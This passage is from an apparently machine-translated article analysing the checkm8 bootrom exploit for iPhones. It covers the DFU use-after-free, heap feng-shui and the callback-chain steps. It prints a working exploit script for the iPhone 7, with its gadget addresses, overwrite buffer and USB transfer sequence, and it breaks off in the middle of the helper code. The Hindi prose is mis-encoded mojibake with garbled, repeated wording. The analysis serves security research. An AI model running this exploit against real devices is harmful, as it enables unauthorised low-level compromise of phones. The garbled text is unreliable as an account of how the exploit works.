рд╡реЗ рд╢реЛрд╖рдг рдореЗрдВ рдЦреБрдж рдПрдХ рд╡рд┐рд╢реЗрд╖ рднреВрдорд┐рдХрд╛ рдирд╣реАрдВ рдирд┐рднрд╛рддреЗ рд╣реИрдВред </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analiz-apollotxt">  рд╡рд┐рд╢реНрд▓реЗрд╖рдг apollo.txt </h2><br><p>  рд╣рдордиреЗ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">apollo.txt</a> рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рд╕реЗ рднреЗрджреНрдпрддрд╛ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдХреЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рд╢реБрд░реВ рдХрд┐рдпрд╛ред  рдпрд╣ <code>DFU</code> рдореЛрдб рдХреЗ рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХрд╛ рд╡рд░реНрдгрди рдХрд░рддрд╛ рд╣реИ: </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li>  рдЬрдм usf рдХреЛ dfu рдкрд░ рдПрдХ рдЫрд╡рд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, dfu рд╕рднреА рдХрдорд╛рдВрдб рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрдирдкреБрдЯ рдФрд░ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдлрд░ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рддрд╛ рд╣реИ </li><li>  рдпрджрд┐ рдЖрдк рдбреЗрдЯрд╛ рдХреЛ dfu рдореЗрдВ рднреЗрдЬрддреЗ рд╣реИрдВ рддреЛ рд╕реЗрдЯрдЕрдк рдкреИрдХреЗрдЯ рдореБрдЦреНрдп рдХреЛрдб рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рддрдм рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЛрдб рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ </li><li>  рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЛрдб рдпрд╣ рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рддрд░рдВрдЧрджреИрд░реНрдзреНрдп рдЗрдирдкреБрдЯ рдЖрдЙрдЯрдкреБрдЯ рдмрдлрд░ рд▓рдВрдмрд╛рдИ рд╕реЗ рдЫреЛрдЯрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдРрд╕рд╛ рд╣реИ рддреЛ рдпрд╣ рдПрдХ рд╕рдВрдХреЗрддрдХ рдХреЛ рдЗрдирдкреБрдЯ рдЖрдЙрдЯрдкреБрдЯ рдмрдлрд░ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реВрдЪрдХ рдХреЗ рд╕рд╛рде рдПрдХ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЕрджреНрдпрддрди рдХрд░рддрд╛ рд╣реИред </li><li>  рдпрд╣ рддрдм рддрд░рдВрдЧрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рд╡рд╣ рд▓рдВрдмрд╛рдИ рд╣реИ рдЬреЛ рдмрдлрд░ рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ </li><li>  usb рдореБрдЦреНрдп рдХреЛрдб рддрдм рд▓рдВрдмрд╛рдИ рдХреЗ рд╕рд╛рде рдПрдХ рд╡реИрд╢реНрд╡рд┐рдХ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдЕрджреНрдпрддрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рд╕рдВрдХреБрд▓ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ </li><li>  рдпрджрд┐ рдХреЛрдИ рдбреЗрдЯрд╛ рдкреИрдХреЗрдЬ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕реВрдЪрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрдирдкреБрдЯ рдЖрдЙрдЯрдкреБрдЯ рдмрдлрд░ рдХреЛ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдПрдХ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдХрд┐рддрдиреЗ рдмрд╛рдЗрдЯ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рдереЗ, рдЗрд╕рдХрд╛ рдЯреНрд░реИрдХ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рд╡реИрд╢реНрд╡рд┐рдХ рдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </li><li>  рдпрджрд┐ рд╕рднреА рдбреЗрдЯрд╛ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддреЛ dfu рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреЛрдб рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрдирдкреБрдЯ рдЖрдЙрдЯрдкреБрдЯ рдмрдлрд░ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдореЗрдореЛрд░реА рд╕реНрдерд╛рди рдкрд░ рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╕реЗ рдмрд╛рдж рдореЗрдВ рдЫрд╡рд┐ рдмреВрдЯ рдХреА рдЬрд╛рддреА рд╣реИ </li><li>  рдЙрд╕рдХреЗ рдмрд╛рдж usb рдХреЛрдб рд╕рднреА рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рд░реАрд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирдП рдкреИрдХреЗрдЬ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рддрд╛ рд╣реИ </li><li>  рдЕрдЧрд░ dfu рдЗрдирдкреБрдЯ рдЖрдЙрдЯрдкреБрдЯ рдмрдлрд╝рд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдЫрд╡рд┐ рдХрд╛ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдмреВрдЯреНрд░реЛрдо рд░реЗрдлрд╝рд░реНрд╕ рдбрдлрд╝реВ рдХреЛ рд╡рд┐рдлрд▓ рдХрд░рддрд╛ рд╣реИ </li></ol><br></blockquote><p>  рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдордиреЗ <code>iBoot</code> рд╕реНрд░реЛрдд рдХреЛрдб рдХреЗ рд╕рд╛рде рд╡рд░реНрдгрд┐рдд рдЪрд░рдгреЛрдВ рдХреА рддреБрд▓рдирд╛ рдХреАред  рдЪреВрдБрдХрд┐ рд╣рдо рд▓реЗрдЦ рдореЗрдВ рд▓реАрдХ рд╣реБрдП рд╕реНрд░реЛрдд рдХреЛрдб рдХреЗ рдЯреБрдХрдбрд╝реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдо <code>IDA</code> рдореЗрдВ рд╣рдорд╛рд░реЗ <code>iPhone 7</code> рд░рд┐рд╡рд░реНрд╕ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдХреЗ <code>SecureROM</code> рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд <code>SecureROM</code> рдХреЛ <code>SecureROM</code> ред  рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ <code>iBoot</code> рдХрд╛ рд╕реЛрд░реНрд╕ рдХреЛрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред </p><br><p>  рдЬрдм <code>DFU</code> рдореЛрдб рдХреЛ рдЗрдирд┐рд╢рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ <code>IO</code> рдмрдлрд░ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ <code>DFU</code> рд▓рд┐рдП рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ <code>USB</code> рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p>  рдЬрдм <code>SETUP</code> рдЕрдиреБрд░реЛрдз рдкреИрдХреЗрдЯ <code>DFU</code> рдореЗрдВ рдЖрддрд╛ рд╣реИ, рддреЛ рд╕рдВрдмрдВрдзрд┐рдд рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд╣реИрдВрдбрд▓рд░ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред  <code>OUT</code> рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рдлрд▓ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЫрд╡рд┐ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рддреЗ рд╕рдордп), рд╣реИрдВрдбрд▓рд░ рдХреЛ рд▓реЗрди-рджреЗрди рдХреЗ рд▓рд┐рдП <code>IO</code> рдмрдлрд░ рдХрд╛ рдкрддрд╛ рдФрд░ рдЙрд╕ рдбреЗрдЯрд╛ рдХреЗ рдЖрдХрд╛рд░ рдХреЛ рд╡рд╛рдкрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕реЗ рд╡рд╣ рд╕реВрдЪрдХ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИред  рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдмрдлрд╝рд░ рдкрддрд╛ рдФрд░ рдЕрдкреЗрдХреНрд╖рд┐рдд рдбреЗрдЯрд╛ рдХрд╛ рдЖрдХрд╛рд░ рд╡реИрд╢реНрд╡рд┐рдХ рдЪрд░ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p>  <code>DFU</code> рд▓рд┐рдП рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд╣реИрдВрдбрд▓рд░ рдиреАрдЪреЗ рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред  рдпрджрд┐ рдЕрдиреБрд░реЛрдз рд╕рд╣реА рд╣реИ, рддреЛ <code>DFU</code> рдЖрд░рдВрднреАрдХрд░рдг рдЪрд░рдг рдореЗрдВ рдЖрд╡рдВрдЯрд┐рдд <code>IO</code> рдмрдлрд░ рдХрд╛ рдкрддрд╛ рдФрд░ рдЕрдкреЗрдХреНрд╖рд┐рдд рдбреЗрдЯрд╛, рдЬреЛ <code>SETUP</code> рдкреИрдХреЗрдЯ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╕реВрдЪрдХ рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p>  <code>Data Stage</code> рджреМрд░рд╛рди, <code>Data Stage</code> рдкреНрд░рддреНрдпреЗрдХ рдЯреБрдХрдбрд╝рд╛ <code>IO</code> рдмрдлрд░ рдХреЛ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж <code>IO</code> рдмрдлрд░ рдХрд╛ рдкрддрд╛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдбреЗрдЯрд╛ рдХрд╛ рдХрд╛рдЙрдВрдЯрд░ рдЕрдкрдбреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рд╕рднреА рдЕрдкреЗрдХреНрд╖рд┐рдд рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдбреЗрдЯрд╛ рд╣реИрдВрдбрд▓рд░ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╡реИрд╢реНрд╡рд┐рдХ рд╕рдВрдЪрд░рдг рд╕реНрдерд┐рддрд┐ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p>  <code>DFU</code> рдбреЗрдЯрд╛ рд╣реИрдВрдбрд▓рд░ рдореЗрдВ, рдкреНрд░рд╛рдкреНрдд рдбреЗрдЯрд╛ рдХреЛ рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдЬрд╛рд░реА рд░рд╣реЗрдЧрд╛ред  <code>iBoot</code> source рдХреЛрдб рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП <code>Apple</code> рдЗрд╕ рдореЗрдореЛрд░реА рдПрд░рд┐рдпрд╛ рдХреЛ <code>INSECURE_MEMORY</code> рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p>  <code>DFU</code> рдореЛрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░, рдкрд╣рд▓реЗ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд <code>IO</code> рдмрдлрд░ рдХреЛ рдореБрдХреНрдд рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред  рдпрджрд┐ рдЫрд╡рд┐ рдХреЛ <code>DFU</code> рдореЛрдб рдореЗрдВ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ рдЗрд╕реЗ рдЪреЗрдХ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред  рдпрджрд┐, <code>DFU</code> рдореЛрдб рдХреЗ рд╕рдВрдЪрд╛рд▓рди рдХреЗ рджреМрд░рд╛рди, рдХреБрдЫ рддреНрд░реБрдЯрд┐ рд╣реБрдИ рдпрд╛ рдкрд░рд┐рдгрд╛рдореА рдЫрд╡рд┐ рдХреЛ рд▓реЛрдб рдХрд░рдирд╛ рдЕрд╕рдВрднрд╡ рд╣реИ, рддреЛ <code>DFU</code> рдХреЛ рдлрд┐рд░ рд╕реЗ <code>DFU</code> рдЬрд╛рдПрдЧрд╛ рдФрд░ рд╕рдм рдХреБрдЫ рдлрд┐рд░ рд╕реЗ рд╢реБрд░реВ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред </p><br><p>  рд╡рд░реНрдгрд┐рдд рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдореЗрдВ <code>use-after-free</code> рднреЗрджреНрдпрддрд╛ рдирд┐рд╣рд┐рдд рд╣реИред  рдпрджрд┐ рдмреВрдЯ рдкрд░, рдПрдХ <code>SETUP</code> рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВ рдФрд░ <code>Data Stage</code> рдХреЛ рдЫреЛрдбрд╝ рдХрд░ рд▓реЗрди-рджреЗрди рдкреВрд░рд╛ рдХрд░реЗрдВ, рддреЛ рд╡реИрд╢реНрд╡рд┐рдХ рд╕реНрдерд┐рддрд┐ <code>DFU</code> рдЪрдХреНрд░ рдореЗрдВ рдлрд┐рд░ рд╕реЗ рдкреНрд░рд╡реЗрд╢ рдХрд░рдиреЗ рдкрд░ рдЖрд░рдВрднрд┐рдХ рд░рд╣реЗрдЧреА, рдФрд░ рд╣рдо рдкрд┐рдЫрд▓реЗ <code>DFU</code> рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдореЗрдВ рдЖрд╡рдВрдЯрд┐рдд <code>IO</code> рдмрдлрд░ рдХреЗ рдкрддреЗ рдкрд░ рд▓рд┐рдЦ рд╕рдХреЗрдВрдЧреЗред </p><br><p>  <code>use-after-free</code> рднреЗрджреНрдпрддрд╛ рд╕реЗ рдирд┐рдкрдЯрдиреЗ рдХреЗ <code>use-after-free</code> , рд╣рдордиреЗ рд╕реЛрдЪрд╛: рдореИрдВ <code>DFU</code> рдХреЗ рдЕрдЧрд▓реЗ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдХреЗ рджреМрд░рд╛рди рдХреБрдЫ рдХреИрд╕реЗ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реВрдВ?  рд╕рдм рдХреЗ рдмрд╛рдж, <code>DFU</code> рдлрд┐рд░ рд╕реЗ рд╢реБрд░реВ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ <code>DFU</code> рдкрд╣рд▓реЗ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рд╕рднреА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдореБрдХреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ рдирдП рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдореЗрдВ рдореЗрдореЛрд░реА рд╕реНрдерд╛рди рдмрд┐рд▓реНрдХреБрд▓ рд╕рдорд╛рди рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред  рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рд╣реИ рдХрд┐ рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдФрд░ рд╕реБрдВрджрд░ рд╕реБрдВрджрд░ рдореЗрдореЛрд░реА рд▓реАрдХ рддреНрд░реБрдЯрд┐ рд╣реИ рдЬреЛ <code>use-after-free</code> рднреЗрджреНрдпрддрд╛ <code>use-after-free</code> рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕реЗ рд╣рдо рдмрд╛рдж рдореЗрдВ рдЪрд░реНрдЪрд╛ рдХрд░реЗрдВрдЧреЗред </p><br><h2 id="analiz-checkm8">  Checkm8 рд╡рд┐рд╢реНрд▓реЗрд╖рдг </h2><br><p>  рд╣рдо рд╕реАрдзреЗ <code>checkm8</code> рд╢реЛрд╖рдг рдХреЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рд▓рд┐рдП рдЖрдЧреЗ рдмрдврд╝рддреЗ рд╣реИрдВред  рд╕рд╛рджрдЧреА рдХреЗ рд▓рд┐рдП, рд╣рдо <code>iPhone 7</code> рд▓рд┐рдП рд╢реЛрд╖рдг рдХреЗ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВрдЧреЗ, рдЬрд┐рд╕рдореЗрдВ рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ рдХреЛрдб рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╢реЛрд╖рдг рдХреЛ рдЦреЛрдП рдмрд┐рдирд╛ <code>USB</code> рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдЕрдиреБрдХреНрд░рдо рдФрд░ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рдмрджрд▓ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдЗрд╕ рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдкреЗрд▓реЛрдб рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕реЗ рдореВрд▓ <code>checkm8.py</code> рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред  рдЕрдиреНрдп рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХреЛ рд╕рдордЭрдирд╛ рдореБрд╢реНрдХрд┐рд▓ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  <code>checkm8</code> рдХрд╛рд░реНрдп рдХреЛ рдХрдИ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: </p><br><ol><li>  рдвреЗрд░ рдХреА рддреИрдпрд╛рд░реА ( <code>heap feng-shui</code> ) </li><li>  рд╡реИрд╢реНрд╡рд┐рдХ рд░рд╛рдЬреНрдп рдХреЛ рдордВрдЬреВрд░реА рдХреЗ рдмрд┐рдирд╛ <code>IO</code> рдмрдлрд░ рдХрд╛ рдЖрд╡рдВрдЯрди рдФрд░ рд░рд┐рд▓реАрдЬ </li><li>  <code>use-after-free</code> рд╕рд╛рде рдвреЗрд░ рдкрд░ <code>usb_device_io_request</code> </li><li>  рдкреЗрд▓реЛрдб рдкреНрд▓реЗрд╕рдореЗрдВрдЯ </li><li>  <code>callback-chain</code> рдирд┐рд╖реНрдкрд╛рджрди </li><li>  <code>shellcode</code> рдирд┐рд╖реНрдкрд╛рджрди </li></ol><br><p>  рдкреНрд░рддреНрдпреЗрдХ рдЪрд░рдг рдкрд░ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред </p><br><h2 id="1-podgotovka-kuchi-heap-feng-shui">  1. рдвреЗрд░ рдХреА рддреИрдпрд╛рд░реА (рдвреЗрд░ рдлреЗрдВрдЧ-рд╢реБрдИ) </h2><br><p>  рдпрд╣ рд╣рдореЗрдВ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╕рдмрд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рдЪрд░рдг рд╣реИ, рдФрд░ рд╣рдордиреЗ рдЗрд╕ рдкрд░ рд╡рд┐рд╢реЗрд╖ рдзреНрдпрд╛рди рджрд┐рдпрд╛ред </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>  рдпрд╣ рдХрджрдо <code>use-after-free</code> рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдвреЗрд░ рд░рд╛рдЬреНрдп рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред  рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЙрд▓ <code>stall</code> , <code>leak</code> , <code>no_leak</code> рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ: </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, 